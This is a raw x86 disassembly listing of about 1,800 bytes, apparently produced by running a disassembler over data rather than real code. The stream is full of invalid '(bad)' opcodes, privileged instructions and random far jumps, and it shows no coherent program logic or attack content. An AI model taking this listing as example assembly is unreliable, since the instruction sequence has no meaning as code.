  41bbb1:	inc    ebp
  41bbb2:	jbe    0x41bbda
  41bbb4:	or     dh,dl
  41bbb6:	(bad)  
  41bbb9:	enter  0xc539,0xa2
  41bbbd:	or     DWORD PTR [ebp-0x41],esi
  41bbc0:	dec    edi
  41bbc1:	adc    eax,0x49a2edbe
  41bbc6:	jno    0x41bb93
  41bbc8:	outs   dx,DWORD PTR ds:[esi]
  41bbc9:	push   ecx
  41bbca:	pop    esi
  41bbcb:	or     eax,0xf2a605ea
  41bbd0:	push   es
  41bbd1:	pop    ecx
  41bbd2:	push   esi
  41bbd3:	xchg   DWORD PTR [ebx],esp
  41bbd5:	(bad)  
  41bbd7:	ss data16 jl 0x41bb70
  41bbdb:	sub    al,cl
  41bbdd:	push   ebx
  41bbde:	jbe    0x41bc25
  41bbe0:	cmp    al,0xb8
  41bbe2:	or     BYTE PTR [edi+eiz*2+0x32],bh
  41bbe6:	pop    ebp
  41bbe7:	das    
  41bbe8:	dec    ebx
  41bbe9:	sub    ah,BYTE PTR [esi+ebx*4+0x489273a6]
  41bbf0:	retf   
  41bbf1:	xor    BYTE PTR ds:0x60da3f5,al
  41bbf7:	xchg   DWORD PTR [ebx+0x58],ebx
  41bbfa:	cmp    BYTE PTR [edx],0x86
  41bbfd:	sub    al,0x56
  41bbff:	aaa    
  41bc00:	sub    eax,DWORD PTR [eax+eiz*4+0x39]
  41bc04:	and    BYTE PTR fs:[edx-0x6cc88fd4],0x7a
  41bc0c:	arpl   WORD PTR [edx+0x6f],sp
  41bc0f:	lock outs dx,BYTE PTR ds:[esi]
  41bc12:	jnp    0x41bc2f
  41bc14:	arpl   WORD PTR [eax+esi*2],sp
  41bc17:	pop    edi
  41bc18:	sub    esi,0xffffff9d
  41bc1b:	and    DWORD PTR [eax],0x17
  41bc1e:	xchg   edx,eax
  41bc1f:	mov    dh,0x74
  41bc21:	sahf   
  41bc22:	dec    ebp
  41bc23:	test   al,0x93
  41bc25:	into   
  41bc26:	fst    QWORD PTR [edx+0x69]
  41bc29:	push   cs
  41bc2a:	ret    0xefc5
  41bc2d:	and    bh,bl
  41bc2f:	cmp    al,0x52
  41bc31:	jp     0x41bbc2
  41bc33:	mov    esi,0x4b69948a
  41bc38:	adc    DWORD PTR ds:0xbce3d1eb,edx
  41bc3e:	mov    dl,0xad
  41bc40:	std    
  41bc41:	sub    bl,ah
  41bc43:	icebp  
  41bc44:	mov    esi,0x384ec017
  41bc49:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41bc4b:	popa   
  41bc4c:	ret    
  41bc4d:	(bad)  
  41bc4e:	cmp    al,0x7c
  41bc50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc52:	mov    bl,0x8e
  41bc54:	adc    DWORD PTR ds:0xa22fef8,0x9151e73a
  41bc5e:	jecxz  0x41bcc9
  41bc60:	sub    eax,0xe93fb48f
  41bc65:	fadd   DWORD PTR [esi-0x57]
  41bc68:	dec    ebx
  41bc69:	xchg   ah,ah
  41bc6b:	inc    ebp
  41bc6c:	jecxz  0x41bc22
  41bc6e:	push   edx
  41bc6f:	jbe    0x41bc6b
  41bc71:	call   FWORD PTR [ecx]
  41bc73:	js     0x41bc52
  41bc75:	mov    esi,0x6f600fb4
  41bc7a:	adc    eax,0xc207ccd7
  41bc7f:	adc    bh,BYTE PTR [ecx-0x26e3fb3a]
  41bc85:	test   esi,edi
  41bc87:	aas    
  41bc88:	retf   
  41bc89:	adc    esi,DWORD PTR [ebp-0x10]
  41bc8c:	inc    edi
  41bc8d:	sub    DWORD PTR [esi+eiz*8-0x64e3e229],edi
  41bc94:	sti    
  41bc95:	or     al,0xaa
  41bc97:	or     eax,0x7399f7dd
  41bc9c:	call   0xc96e610a
  41bca1:	fisub  WORD PTR [esi-0x256a93d]
  41bca7:	push   esp
  41bca8:	jp     0x41bc76
  41bcaa:	fcomp  DWORD PTR [ebx-0x1]
  41bcad:	repz pop es
  41bcaf:	sub    DWORD PTR [ebx],eax
  41bcb1:	dec    ebp
  41bcb2:	xchg   edi,eax
  41bcb3:	mov    bl,0xc6
  41bcb5:	dec    ebx
  41bcb6:	mov    dl,0xc3
  41bcb8:	out    0x41,al
  41bcba:	sub    DWORD PTR [eax+0x510e56af],0xfffffff7
  41bcc1:	(bad)  
  41bcc2:	out    dx,eax
  41bcc3:	pop    ss
  41bcc4:	loop   0x41bd3f
  41bcc6:	cdq    
  41bcc7:	pop    ebp
  41bcc8:	push   esi
  41bcc9:	pop    ecx
  41bcca:	cli    
  41bccb:	(bad)  
  41bccc:	xor    al,dl
  41bcce:	or     ecx,DWORD PTR [ecx+0xfdea2ef]
  41bcd4:	jle    0x41bc8a
  41bcd6:	mov    dl,BYTE PTR [edi-0x64]
  41bcd9:	pop    ss
  41bcda:	inc    edx
  41bcdb:	popa   
  41bcdc:	test   BYTE PTR [esp+edi*1],dl
  41bcdf:	js     0x41bce6
  41bce1:	or     DWORD PTR ss:[esi],edx
  41bce4:	sti    
  41bce5:	mov    dh,0xe5
  41bce7:	mov    ds:0xd66e8743,al
  41bcec:	cmp    eax,0x247e7e81
  41bcf1:	aad    0x46
  41bcf3:	sti    
  41bcf4:	sbb    DWORD PTR [edx],edi
  41bcf6:	inc    eax
  41bcf7:	enter  0xf600,0xe9
  41bcfb:	cmp    DWORD PTR [ebx+0x2ac0f6e1],esi
  41bd01:	loop   0x41bd43
  41bd03:	push   eax
  41bd04:	loop   0x41bd54
  41bd06:	inc    esi
  41bd07:	out    0xde,al
  41bd09:	vsubss xmm1,xmm1,xmm5
  41bd0d:	adc    dl,bh
  41bd0f:	into   
  41bd10:	pop    es
  41bd11:	pop    esp
  41bd12:	(bad)  
  41bd13:	lds    esp,FWORD PTR [edx-0x3e]
  41bd16:	in     al,dx
  41bd17:	sbb    bh,BYTE PTR [ebx+0xfa9677b]
  41bd1d:	out    0x48,al
  41bd1f:	(bad)  
  41bd20:	pop    esp
  41bd21:	adc    DWORD PTR [esi+0xa],eax
  41bd24:	lock jmp 0xe12:0xc6d8ecd
  41bd2c:	and    BYTE PTR [edx+0xc],bl
  41bd2f:	mov    ah,0x47
  41bd31:	dec    eax
  41bd32:	data16 (bad) 
  41bd34:	jmp    0xf533:0x5c60e3c2
  41bd3b:	imul   ebx,ecx,0xffffff84
  41bd3e:	xlat   BYTE PTR ds:[ebx]
  41bd3f:	xor    BYTE PTR ds:0x983a5ae8,dl
  41bd45:	mov    bh,0xab
  41bd47:	pop    ds
  41bd48:	lods   al,BYTE PTR ds:[esi]
  41bd49:	fimul  DWORD PTR [edx-0x64]
  41bd4c:	dec    ebx
  41bd4d:	mov    ecx,0xc99ec80d
  41bd52:	jmp    0x4cbd32c3
  41bd57:	hlt    
  41bd58:	pop    es
  41bd59:	inc    edx
  41bd5a:	cmp    dl,bl
  41bd5c:	and    bh,BYTE PTR [edi+0x32]
  41bd5f:	imul   esi,DWORD PTR [ebx+ebx*4+0xa],0x69
  41bd64:	sub    al,0xb
  41bd66:	fs lods eax,DWORD PTR ds:[esi]
  41bd69:	xor    BYTE PTR [ecx+ebp*2+0x43358a8],dh
  41bd70:	jp     0x41bd31
  41bd72:	out    0x52,al
  41bd74:	or     eax,0xcbfd4b70
  41bd79:	popf   
  41bd7a:	leave  
  41bd7b:	jmp    0x9eb9a3ac
  41bd80:	and    ebp,DWORD PTR [edi]
  41bd82:	jg     0x41bd41
  41bd84:	jo     0x41bd6c
  41bd86:	jp     0x41bdb5
  41bd88:	mov    WORD PTR [ebx-0x2d],?
  41bd8b:	mov    ds:0x595b4b24,al
  41bd90:	loope  0x41bd59
  41bd92:	daa    
  41bd93:	mov    esp,0x81e6c1c9
  41bd98:	mov    al,0xbe
  41bd9a:	hlt    
  41bd9b:	add    bh,BYTE PTR [ecx+0x74]
  41bd9e:	xor    al,0xf5
  41bda0:	popa   
  41bda1:	push   edx
  41bda2:	das    
  41bda3:	icebp  
  41bda4:	gs jmp 0x41bdaa
  41bda7:	jl     0x41bd32
  41bda9:	xor    BYTE PTR [ecx+edx*2],bl
  41bdac:	idiv   DWORD PTR [ecx+eax*4]
  41bdaf:	dec    esi
  41bdb0:	loop   0x41be23
  41bdb2:	inc    esp
  41bdb3:	imul   ebp,DWORD PTR [edi],0x8364370d
  41bdb9:	test   cl,0xf1
  41bdbc:	imul   eax,DWORD PTR [ebx-0xa],0x64
  41bdc0:	cdq    
  41bdc1:	mov    dl,0x6e
  41bdc3:	dec    ebx
  41bdc4:	lahf   
  41bdc5:	fnstsw WORD PTR [ebx+0x31]
  41bdc8:	jbe    0x41be0a
  41bdca:	leave  
  41bdcb:	or     DWORD PTR [edi-0x66e560d3],ebp
  41bdd1:	inc    esp
  41bdd2:	inc    ebp
  41bdd3:	sbb    esp,esi
  41bdd5:	jp     0x41bdfd
  41bdd7:	stos   DWORD PTR es:[edi],eax
  41bdd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd9:	sub    eax,0xd5546821
  41bdde:	sub    al,0xb
  41bde0:	lods   eax,DWORD PTR ds:[esi]
  41bde1:	loopne 0x41bde4
  41bde3:	out    dx,al
  41bde4:	dec    esp
  41bde5:	in     al,0x20
  41bde7:	outs   dx,DWORD PTR ds:[esi]
  41bde8:	xor    BYTE PTR [edx-0x37],al
  41bdeb:	ja     0x41bde2
  41bded:	push   esi
  41bdee:	mov    eax,ds:0xf0871db8
  41bdf3:	popf   
  41bdf4:	pop    ecx
  41bdf5:	(bad)  
  41bdf6:	mov    dh,0x32
  41bdf8:	jp     0x41be74
  41bdfa:	lahf   
  41bdfb:	mov    gs,ebx
  41bdfd:	cwde   
  41bdfe:	sub    eax,0x2f54690
  41be03:	aaa    
  41be04:	xchg   edi,eax
  41be05:	pusha  
  41be06:	pop    edi
  41be07:	repnz loopne 0x41bdc5
  41be0a:	pop    esi
  41be0b:	push   edi
  41be0c:	cld    
  41be0d:	shl    BYTE PTR [ecx+0x46637958],1
  41be13:	mov    al,0xcf
  41be15:	sub    cl,BYTE PTR [eax+0x1d0a8a22]
  41be1b:	popf   
  41be1c:	cmp    bh,BYTE PTR [ecx-0x27]
  41be1f:	pop    eax
  41be20:	(bad)  
  41be21:	and    eax,DWORD PTR [eax-0x50]
  41be24:	cmp    bh,bh
  41be26:	sar    DWORD PTR [eax+0x573dd117],0xc
  41be2d:	mov    ds:0xbbdb1854,al
  41be32:	mov    ebx,0x948f293c
  41be37:	pop    ebp
  41be38:	xlat   BYTE PTR ds:[ebx]
  41be39:	retf   
  41be3a:	cmp    eax,0xb6f615ab
  41be3f:	add    esp,DWORD PTR [esi-0x5d]
  41be42:	stos   DWORD PTR es:[edi],eax
  41be43:	(bad)  
  41be45:	enter  0xfc72,0xd7
  41be49:	and    bh,bh
  41be4b:	and    al,0xbb
  41be4d:	outs   dx,BYTE PTR fs:[esi]
  41be4f:	(bad)  
  41be50:	xchg   edi,eax
  41be51:	cwde   
  41be52:	xchg   esi,eax
  41be53:	jmp    0x776b6c95
  41be58:	xor    bl,ch
  41be5a:	mov    dl,bl
  41be5c:	push   ss
  41be5d:	fnsave [ebp-0x12]
  41be60:	jp     0x41be9a
  41be62:	and    BYTE PTR [ebx-0x68],0xb4
  41be66:	lea    esp,[edi+0x141b3bfd]
  41be6c:	and    BYTE PTR ds:0xd95167e7,ah
  41be72:	test   eax,0xf09c6af1
  41be77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be78:	scas   al,BYTE PTR es:[edi]
  41be79:	mov    edx,0x7623a41f
  41be7e:	jge    0x41bee6
  41be80:	das    
  41be81:	inc    edi
  41be82:	int    0x66
  41be84:	jno    0x41be33
  41be86:	iret   
  41be87:	sub    ebx,edi
  41be89:	xor    BYTE PTR [eax+edi*8],dh
  41be8c:	and    cl,ah
  41be8e:	cmp    DWORD PTR [ecx+0x4e02d44e],edx
  41be94:	push   esi
  41be95:	sbb    eax,0x60f9f3bd
  41be9a:	and    bh,BYTE PTR [ebx-0x18]
  41be9d:	mov    eax,0xbf43f4de
  41bea2:	je     0x41be5d
  41bea4:	outs   dx,DWORD PTR ds:[esi]
  41bea5:	xor    edi,DWORD PTR ss:[ebp+0x3313aae1]
  41beac:	cmp    ebp,esi
  41beae:	adc    BYTE PTR [ecx],0x2c
  41beb1:	mov    ch,0x59
  41beb3:	adc    cl,BYTE PTR [esi+0x5a0c1b03]
  41beb9:	jmp    0x73a5a111
  41bebe:	jo     0x41be88
  41bec0:	test   al,0x16
  41bec2:	and    DWORD PTR [ebx+0x50676b3],edx
  41bec8:	add    DWORD PTR [ebp+0x51],0x3da35d9d
  41becf:	popf   
  41bed0:	xchg   DWORD PTR [edi-0xa],ecx
  41bed3:	add    ebp,DWORD PTR ds:0x9034f193
  41bed9:	fstp   TBYTE PTR [ebx]
  41bedb:	jmp    0x41be7e
  41bedd:	mov    esi,0xad666a8b
  41bee2:	lock sub ecx,DWORD PTR [ecx+esi*2-0x5aacd34d]
  41beea:	call   0x33a5:0x9fa7808a
  41bef1:	int3   
  41bef2:	push   es
  41bef3:	mov    eax,ds:0x42e1162a
  41bef8:	jbe    0x41bf0c
  41befa:	test   ebx,0x362ff395
  41bf00:	nop
  41bf01:	arpl   ax,dx
  41bf03:	xlat   BYTE PTR ds:[ebx]
  41bf04:	mov    al,ds:0xa811d895
  41bf09:	inc    ebx
  41bf0a:	imul   edx,DWORD PTR gs:[edi-0x54],0xbfc336e5
  41bf12:	sub    eax,0x188926bc
  41bf17:	imul   ecx,DWORD PTR [edx],0x3029a2a7
  41bf1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf1e:	push   ecx
  41bf1f:	jb     0x41bea1
  41bf21:	cmc    
  41bf22:	xchg   ecx,eax
  41bf23:	(bad)  
  41bf27:	mov    bl,0xb0
  41bf29:	shl    ebp,0x61
  41bf2c:	imul   BYTE PTR [ecx]
  41bf2e:	mov    dl,0x2d
  41bf30:	xor    DWORD PTR [eax+0x4f6d6e7],eax
  41bf36:	fwait
  41bf37:	or     al,0xc0
  41bf39:	xor    ebp,0xab249ca0
  41bf3f:	in     eax,0x76
  41bf41:	add    ecx,edi
  41bf43:	sbb    ebx,DWORD PTR [esi+ebx*1]
  41bf46:	sbb    DWORD PTR [ecx-0x4fbcad46],ecx
  41bf4c:	test   eax,0x2fa57a84
  41bf51:	mov    ebp,DWORD PTR [esi]
  41bf53:	xor    BYTE PTR [esp+ebp*2],0xb9
  41bf57:	out    dx,al
  41bf58:	es aam 0x27
  41bf5b:	jmp    0x5ed1:0x7ecba7b
  41bf62:	iret   
  41bf63:	in     eax,dx
  41bf64:	sbb    ebx,edx
  41bf66:	sub    eax,0x4cd34f4b
  41bf6b:	fisub  DWORD PTR [ecx-0xe]
  41bf6e:	dec    DWORD PTR [ecx]
  41bf70:	ficomp DWORD PTR [ebx-0x37cb077a]
  41bf76:	mov    al,0xfe
  41bf78:	dec    eax
  41bf79:	mov    ch,0xa4
  41bf7b:	je     0x41bf45
  41bf7d:	dec    esi
  41bf7e:	mov    edx,0xb3ae8dde
  41bf83:	cmp    esi,DWORD PTR [edx]
  41bf85:	lahf   
  41bf86:	mov    edi,0x8a00c783
  41bf8b:	dec    esi
  41bf8c:	test   BYTE PTR [esi-0x1022009d],dh
  41bf92:	dec    ebx
  41bf93:	xor    DWORD PTR [ecx+0x6b],edi
  41bf96:	popa   
  41bf97:	fsubr  QWORD PTR [ecx-0x65]
  41bf9a:	push   0xffffff9d
  41bf9c:	add    al,0x69
  41bf9e:	and    cl,cl
  41bfa0:	push   ebp
  41bfa1:	(bad)  
  41bfa3:	dec    eax
  41bfa4:	out    dx,eax
  41bfa5:	and    DWORD PTR [edx-0x23],esi
  41bfa8:	xchg   BYTE PTR [ecx+0x49],al
  41bfab:	je     0x41bf91
  41bfad:	fidivr WORD PTR [esi+0x11]
  41bfb0:	fbstp  TBYTE PTR ds:[esi-0x6e]
  41bfb4:	xchg   edi,eax
  41bfb5:	outs   dx,BYTE PTR ds:[esi]
  41bfb6:	jne    0x41bf92
  41bfb8:	das    
  41bfb9:	mov    ecx,0x515db4d1
  41bfbe:	pop    eax
  41bfbf:	leave  
  41bfc0:	int    0x5e
  41bfc2:	pop    eax
  41bfc3:	imul   eax,DWORD PTR [ebx],0x54
  41bfc6:	adc    al,0xeb
  41bfc8:	(bad)  
  41bfc9:	mov    eax,0x685eba92
  41bfce:	xchg   DWORD PTR [edx-0x7e491907],eax
  41bfd4:	xchg   edx,eax
  41bfd5:	fild   DWORD PTR [ecx-0x57]
  41bfd8:	cmp    ecx,eax
  41bfda:	aas    
  41bfdb:	mov    eax,0x98d67f4a
  41bfe0:	xchg   ecx,eax
  41bfe1:	in     al,0xc8
  41bfe3:	lds    ebp,FWORD PTR [ecx]
  41bfe5:	(bad)  
  41bfe6:	xchg   ebp,eax
  41bfe7:	xchg   DWORD PTR [ebp-0x76],ebx
  41bfea:	leave  
  41bfeb:	mov    dl,0x37
  41bfed:	add    eax,0xbcec5859
  41bff2:	add    bl,BYTE PTR [ebx+edx*4+0x5b]
  41bff6:	fnstenv [edi+0x7c677a44]
  41bffc:	aam    0xc8
  41bffe:	out    dx,al
  41bfff:	adc    BYTE PTR [edx],al
  41c001:	fbld   TBYTE PTR [eax]
  41c003:	lock adc esi,esp
  41c006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c007:	lahf   
  41c008:	pusha  
  41c009:	cs test ebx,0x64634292
  41c010:	mov    WORD PTR [esi],?
  41c012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c013:	xchg   edi,eax
  41c014:	push   esp
  41c015:	int    0xdf
  41c017:	cmp    ecx,0xffffffae
  41c01a:	push   ecx
  41c01b:	push   0xb7137815
  41c020:	retf   0x975d
  41c023:	adc    BYTE PTR [esi],dh
  41c025:	retf   0x2f57
  41c028:	mov    dh,0x82
  41c02a:	in     al,dx
  41c02b:	jnp    0x41c063
  41c02d:	out    0x2b,al
  41c02f:	sbb    al,0xf5
  41c031:	inc    esp
  41c032:	mov    esp,0x122cac30
  41c037:	out    0x39,al
  41c039:	ja     0x41c01f
  41c03b:	sbb    DWORD PTR [edi+0x6b8c3fc0],esi
  41c041:	sbb    eax,0x5975bf79
  41c046:	jecxz  0x41bfcc
  41c048:	shl    BYTE PTR [ecx+ebx*2],0x73
  41c04c:	mov    BYTE PTR [edx],cl
  41c04e:	sbb    al,0x66
  41c050:	xchg   esi,eax
  41c051:	lock push edx
  41c053:	ret    0xf842
  41c056:	mov    dh,0x8f
  41c058:	fist   DWORD PTR [eax]
  41c05a:	mov    ebx,0x9b25b592
  41c05f:	mov    cl,0x9f
  41c061:	inc    edi
  41c062:	es in  eax,dx
  41c064:	jmp    0x41bfe7
  41c066:	cli    
  41c067:	(bad)  
  41c068:	cs xchg ebp,eax
  41c06a:	int    0xef
  41c06c:	data16 hlt 
  41c06e:	jge    0x41c013
  41c070:	mov    al,ds:0x2a22a258
  41c075:	or     al,0x5d
  41c077:	mov    eax,ds:0x7d995e3b
  41c07c:	cld    
  41c07d:	dec    eax
  41c07e:	jb     0x41c02f
  41c080:	loopne 0x41c0f4
  41c082:	lods   al,BYTE PTR ds:[esi]
  41c083:	out    dx,al
  41c084:	dec    ecx
  41c085:	outs   dx,BYTE PTR ds:[esi]
  41c086:	stos   BYTE PTR es:[edi],al
  41c087:	xchg   ebx,eax
  41c088:	int3   
  41c089:	xlat   BYTE PTR ds:[ebx]
  41c08a:	jno    0x41c087
  41c08c:	dec    ebp
  41c08d:	fldenv [edx-0x51]
  41c090:	aad    0x8f
  41c092:	sbb    bh,BYTE PTR [ebp+0x4196d718]
  41c098:	ffreep st(4)
  41c09a:	mov    al,0xed
  41c09c:	cmp    DWORD PTR [ecx],0xffffff83
  41c09f:	(bad)  
  41c0a0:	jns    0x41c0b6
  41c0a2:	jns    0x41c08f
  41c0a4:	mov    bx,0x9b0
  41c0a8:	mov    al,ds:0x1dcba61
  41c0ad:	loop   0x41c075
  41c0af:	cmp    eax,0xe0531fa7
  41c0b4:	push   ds
  41c0b5:	sub    eax,0xa67619d9
  41c0ba:	ins    DWORD PTR es:[edi],dx
  41c0bb:	stos   BYTE PTR es:[edi],al
  41c0bc:	out    0xf8,eax
  41c0be:	retf   
  41c0bf:	or     al,0x9b
  41c0c1:	inc    esp
  41c0c2:	push   es
  41c0c3:	jge    0xbdddc7a9
  41c0c9:	xlat   BYTE PTR ds:[ebx]
  41c0ca:	add    eax,0xb3731b45
  41c0cf:	mov    ebx,DWORD PTR [eax+ebx*8+0x2d]
  41c0d3:	leave  
  41c0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0d5:	dec    eax
  41c0d6:	xor    al,0xef
  41c0d8:	cmp    eax,0x1f94292
  41c0dd:	mul    BYTE PTR [esi-0x206aab10]
  41c0e3:	outs   dx,DWORD PTR ds:[esi]
  41c0e4:	inc    esp
  41c0e5:	scas   eax,DWORD PTR es:[edi]
  41c0e6:	sub    BYTE PTR [esi],cl
  41c0e8:	scas   eax,DWORD PTR es:[edi]
  41c0e9:	in     al,0x69
  41c0eb:	sub    DWORD PTR [esi],edx
  41c0ed:	pop    edi
  41c0ee:	xchg   ebp,eax
  41c0ef:	xchg   esi,eax
  41c0f0:	or     ebp,DWORD PTR [esi-0x50]
  41c0f3:	jg     0x41c11a
  41c0f5:	mov    bh,ah
  41c0f7:	call   0xfe78:0x32af53a
  41c0fe:	mov    dh,0x22
  41c100:	repz aam 0x22
  41c103:	or     ebx,DWORD PTR [ecx]
  41c105:	add    al,0x21
  41c107:	dec    ecx
  41c108:	jmp    0x41c10f
  41c10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c10b:	sbb    BYTE PTR [eax+0x27e8fbaa],dl
  41c111:	pop    edi
  41c112:	shl    BYTE PTR [ecx],0x8e
  41c115:	xchg   BYTE PTR ds:0x251b93f3,bl
  41c11b:	pop    ebx
  41c11c:	add    eax,0x9713ad95
  41c121:	push   esi
  41c122:	mov    ah,0x6c
  41c124:	fwait
  41c125:	and    al,0xa1
  41c127:	mov    ch,0xfc
  41c129:	lahf   
  41c12a:	clc    
  41c12b:	mov    bh,0x9e
  41c12d:	jns    0x41c106
  41c12f:	hlt    
  41c130:	push   esi
  41c131:	ds inc esi
  41c133:	std    
  41c134:	pop    ecx
  41c135:	into   
  41c136:	dec    esi
  41c137:	nop
  41c138:	sbb    al,0xa7
  41c13a:	mov    ds:0xa0fdf932,al
  41c13f:	or     DWORD PTR [edx+eiz*2+0x44583429],edx
  41c146:	add    al,0x11
  41c148:	shr    DWORD PTR fs:[eax+0x52],0x77
  41c14d:	push   ecx
  41c14e:	icebp  
  41c14f:	mov    dl,BYTE PTR fs:[edx+0x6d]
  41c153:	dec    edi
  41c154:	push   esi
  41c155:	rcr    DWORD PTR [eax],1
  41c157:	mov    ah,0x41
  41c159:	pop    ss
  41c15a:	es mov ch,0xc5
  41c15d:	push   es
  41c15e:	pop    ebx
  41c15f:	mov    dl,0xb1
  41c161:	adc    dl,BYTE PTR [edx]
  41c163:	imul   ecx,DWORD PTR [ebp-0x90cd8c8],0x7d990eba
  41c16d:	retf   0xd855
  41c170:	sub    ch,BYTE PTR ds:0x20200e09
  41c176:	pop    edx
  41c177:	out    dx,al
  41c178:	(bad)  
  41c179:	mov    ebx,0xdd24690b
  41c17e:	(bad)  
  41c17f:	mov    WORD PTR [ebx-0xd],?
  41c182:	pop    es
  41c183:	test   bh,al
  41c185:	sbb    DWORD PTR [ebx+eax*1+0x5ca17bc4],0xfffffffa
  41c18d:	jge    0x41c203
  41c18f:	es test al,0xd2
  41c192:	jb     0x41c141
  41c194:	addr16 aam 0xcc
  41c197:	xchg   ecx,eax
  41c198:	mov    al,BYTE PTR [edi+0x3f]
  41c19b:	out    0xe7,eax
  41c19d:	push   ebp
  41c19e:	mov    ds:0x2128ae88,al
  41c1a3:	fwait
  41c1a4:	push   cs
  41c1a5:	dec    ebp
  41c1a6:	dec    esp
  41c1a7:	dec    esp
  41c1a8:	mov    edx,0xd25c80f1
  41c1ad:	cmp    ch,dl
  41c1af:	xchg   edi,eax
  41c1b0:	xchg   ebx,eax
  41c1b1:	mov    ebp,0x65e35d28
  41c1b6:	cmp    al,ah
  41c1b8:	fwait
  41c1b9:	cmp    al,0x7e
  41c1bb:	pop    eax
  41c1bc:	push   ss
  41c1bd:	cmc    
  41c1be:	push   0xb9739cfa
  41c1c3:	jne    0x41c1de
  41c1c5:	test   eax,0x653501d5
  41c1ca:	out    0xc6,eax
  41c1cc:	retf   0x4b3f
  41c1cf:	jns    0x41c1ee
  41c1d1:	lods   eax,DWORD PTR ds:[esi]
  41c1d2:	std    
  41c1d3:	mov    DWORD PTR [ebp-0x23],eax
  41c1d6:	push   cs
  41c1d7:	jge    0x41c176
  41c1d9:	pushf  
  41c1da:	sbb    edi,DWORD PTR [ebx+0xb]
  41c1dd:	pusha  
  41c1de:	lods   eax,DWORD PTR ds:[esi]
  41c1df:	inc    edx
  41c1e0:	test   bl,al
  41c1e2:	or     bl,ah
  41c1e4:	push   ecx
  41c1e5:	dec    edx
  41c1e6:	leave  
  41c1e7:	(bad)  
  41c1e9:	icebp  
  41c1ea:	in     al,0xd8
  41c1ec:	aaa    
  41c1ed:	jnp    0x41c212
  41c1ef:	addr16 clc 
  41c1f1:	out    dx,eax
  41c1f2:	sbb    ch,BYTE PTR [esi+0x8942409]
  41c1f8:	(bad)
  41c1fb:	lahf   
  41c1fc:	dec    ecx
  41c1fd:	aas    
  41c1fe:	fsubr  st,st(6)
  41c200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c201:	and    eax,0x53aadd1c
  41c206:	dec    esp
  41c207:	int    0x6
  41c209:	mov    ds:0x695f4bbe,eax
  41c20e:	ins    DWORD PTR es:[edi],dx
  41c20f:	xor    al,0xf5
  41c211:	inc    ecx
  41c212:	arpl   WORD PTR ds:0x5c13e84f,di
  41c218:	sahf   
  41c219:	ret    0x6b92
  41c21c:	jg     0x41c243
  41c21e:	jno    0x41c255
  41c220:	xchg   esp,eax
  41c221:	mov    gs,WORD PTR [eax-0x36032314]
  41c227:	xchg   ebx,eax
  41c228:	jmp    0x3c6a7e5f
  41c22d:	push   es
  41c22e:	leave  
  41c22f:	es push ebp
  41c231:	dec    ebx
  41c232:	sti    
  41c233:	sbb    al,0x29
  41c235:	bound  eax,QWORD PTR [eax+0x4b]
  41c238:	stos   BYTE PTR es:[edi],al
  41c239:	mov    al,0xca
  41c23b:	adc    DWORD PTR [edi-0x5df7fad4],ebx
  41c241:	xor    DWORD PTR [edi+0x2e],esp
  41c244:	pop    ss
  41c245:	mov    ch,ch
  41c247:	sub    eax,0xa142af5d
  41c24c:	inc    ebx
  41c24d:	xor    eax,0xf6625b9a
  41c252:	cwde   
  41c253:	mov    eax,0x3c328927
  41c258:	or     dh,BYTE PTR [ebx]
  41c25a:	mov    cl,0xeb
  41c25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c25d:	push   edx
  41c25e:	or     eax,0x1b1aa182
  41c263:	nop
  41c264:	scas   eax,DWORD PTR es:[edi]
  41c265:	push   ebx
  41c266:	xchg   esp,eax
  41c267:	int    0xb2
  41c269:	add    BYTE PTR [ebx],dl
  41c26b:	jne    0x41c2c3
  41c26d:	ins    DWORD PTR es:[edi],dx
  41c26e:	mov    dl,0xbe
  41c270:	loope  0x41c22a
  41c272:	ror    DWORD PTR [esi+0x5d7d91e],0x89
  41c279:	xchg   ebp,eax
  41c27a:	adc    ch,ch
  41c27c:	enter  0x7c72,0x68
  41c280:	xor    DWORD PTR [ebp+0x30],esi
  41c283:	or     eax,0x7283684
  41c288:	inc    ecx
  41c289:	or     ch,BYTE PTR [ebx]
  41c28b:	add    BYTE PTR es:[ebx-0x5ac98c94],cl
  41c292:	in     al,dx
  41c293:	or     BYTE PTR [edi+eax*1],ch
  41c296:	pop    ebp
  41c297:	cli    
  41c298:	fist   WORD PTR [eax-0x46fbb751]
  41c29e:	mov    ecx,0x2df37732
  41c2a3:	hlt    
  41c2a4:	in     eax,dx
  41c2a5:	loope  0x41c2cb
  41c2a7:	sub    BYTE PTR [edx+eax*8-0x5cf61903],cl
  41c2ae:	add    eax,0xa374b7d7
  41c2b3:	frstor [ebx+0x52]
  41c2b6:	or     eax,0xc307098c
  41c2bb:	jl     0x41c2da
  41c2bd:	cmp    eax,eax
  41c2bf:	and    DWORD PTR [eax],esp
  41c2c1:	mov    bl,0x8d
  41c2c3:	test   eax,0x870d65e4
  41c2c8:	sub    cl,al
  41c2ca:	cwde   
  41c2cb:	mov    dl,0x16
  41c2cd:	inc    ebp
  41c2ce:	or     ebx,DWORD PTR [edi+0x73]
  41c2d1:	shl    esp,0x6a
  41c2d4:	cmc    
  41c2d5:	push   eax
  41c2d6:	and    bh,0x84
  41c2d9:	dec    ecx
  41c2da:	shr    DWORD PTR [esi+0x3c3a8d68],cl
  41c2e0:	ret    0x989f
  41c2e3:	pop    eax
  41c2e4:	lds    edx,FWORD PTR [esi+0x45753a23]
  41c2ea:	icebp  
  41c2eb:	dec    ebp
  41c2ec:	push   cs
  41c2ed:	dec    edx
  41c2ee:	and    esi,DWORD PTR [ebp-0x25e129c9]
  41c2f4:	sub    eax,0xffbee6fb
  41c2f9:	inc    esi
  41c2fa:	sbb    esi,DWORD PTR [ebx-0x1e551cf1]
  41c300:	push   edi
  41c301:	cmp    dl,BYTE PTR [esp+ecx*2+0x4f0da6ad]
  41c308:	sbb    al,BYTE PTR [edx-0xba277d5]
  41c30e:	xchg   ebp,eax
  41c30f:	arpl   si,di
